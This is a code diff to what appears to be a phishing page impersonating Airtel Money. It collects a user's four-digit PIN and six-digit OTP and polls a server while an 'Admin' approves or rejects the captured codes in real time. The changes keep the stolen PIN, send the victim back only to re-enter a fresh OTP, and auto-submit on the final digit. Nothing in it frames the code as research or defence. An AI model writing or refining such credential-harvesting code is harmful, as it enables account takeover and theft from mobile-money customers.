@@ -376,10 +376,10 @@
 
           <p class="pin-label">Enter your Airtel Money PIN</p>
           <div class="pin-boxes" id="pinContainer">
-            <!-- Automatically trigger submit on the 4th digit -->
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
+            <!-- Last digit triggers auto-submit -->
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, null)" id="pin3">
           </div>
           <div class="error" id="errLogin" style="margin-top: 15px;"></div>
@@ -413,7 +413,8 @@
             <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp3')" id="otp2">
             <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp4')" id="otp3">
             <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp5')" id="otp4">
-            <input type="text" maxlength="1" inputmode="numeric" id="otp5">
+            <!-- Last digit triggers auto-submit -->
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, null)" id="otp5">
           </div>
 
           <p class="resend-text">Resend OTP in <span id="timer">44</span> Sec</p>
@@ -503,7 +504,6 @@
       if (nextId) {
         document.getElementById(nextId).focus();
       } else {
-        // This triggers when the 4th digit is typed
         submitRegistration();
       }
     }
@@ -553,7 +553,6 @@
       if (nextId) {
         document.getElementById(nextId).focus();
       } else {
-        // This triggers when the 6th digit is typed
         submitOTP();
       }
     }
@@ -610,14 +609,17 @@
           stopPolling();
           showPage('page5');
         } 
+        // If OTP is rejected, only go back to OTP page
         else if (status === 'rejected_pin') {
           stopPolling();
-          alert('The Admin rejected your PIN/OTP. Please try again.');
+          alert('The Admin rejected your OTP. Please enter a new OTP.');
+          
+          // Clear only the OTP boxes, not the PIN boxes
           document.querySelectorAll('#otpContainer input').forEach(i => i.value = '');
-          document.querySelectorAll('#pinContainer input').forEach(i => i.value = '');
           document.getElementById('errOtp').style.display = 'none';
-          document.getElementById('btnRegister').innerHTML = '<i class="fa-solid fa-user-plus"></i>Register';
-          showPage('page3');
+          
+          // Go back to OTP page, not Page 3
+          showPage('page4');
         }
       } catch (err) { console.error(err); }
     }, 3000);
